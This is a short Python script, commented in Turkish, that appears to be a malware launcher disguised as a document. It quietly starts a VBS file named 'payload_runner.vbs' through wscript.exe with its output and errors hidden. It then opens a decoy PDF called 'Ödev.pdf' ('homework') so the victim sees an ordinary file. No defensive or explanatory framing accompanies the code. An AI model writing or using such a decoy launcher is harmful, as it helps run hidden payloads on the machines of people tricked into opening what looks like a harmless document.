import os
import subprocess
import time

# Açılacak gerçek dosya (kullanıcıya gösterilir)
real_file = "Ödev.pdf"

# Payload VBS dosyasını arka planda çalıştır
try:
    subprocess.Popen(["wscript.exe", "payload_runner.vbs"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

# Gerçek dosyayı aç
try:
    os.startfile(real_file)
except:
    pass
